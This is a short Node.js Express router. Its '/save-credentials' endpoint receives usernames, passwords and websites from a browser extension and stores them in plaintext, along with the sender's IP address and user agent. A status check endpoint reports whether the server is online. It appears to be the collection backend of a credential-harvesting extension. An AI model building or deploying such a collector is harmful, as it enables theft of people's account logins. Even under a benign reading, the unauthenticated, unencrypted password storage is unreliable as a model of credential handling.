const express = require('express');
const Credential = require('../models/Credential');
const router = express.Router();

// Middleware to extract IP and user agent
const extractRequestInfo = (req, res, next) => {
  req.ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  req.userAgent = req.headers['user-agent'];
  next();
};

// API endpoint to receive credentials from the extension
router.post('/save-credentials', extractRequestInfo, async (req, res) => {
  try {
    const { username, password, website, domain, timestamp } = req.body;
    
    if (!username || !password || !website) {
      return res.status(400).json({
        success: false,
        message: 'Please provide username, password and website'
      });
    }
    
    // Create new credential record
    const credential = await Credential.create({
      username,
      password,
      website,
      domain: domain || new URL(website).hostname,
      timestamp: timestamp || new Date(),
      ipAddress: req.ipAddress,
      userAgent: req.userAgent
    });
    
    res.status(201).json({
      success: true,
      data: {
        id: credential._id,
        domain: credential.domain
      }
    });
  } catch (error) {
    console.error('Error saving credential:', error);
    res.status(500).json({
      success: false,
      message: 'Server error while saving credential'
    });
  }
});

// Simple status endpoint to check if the server is running
router.get('/status', (req, res) => {
  res.status(200).json({
    success: true,
    status: 'online',
    timestamp: new Date()
  });
});

module.exports = router;
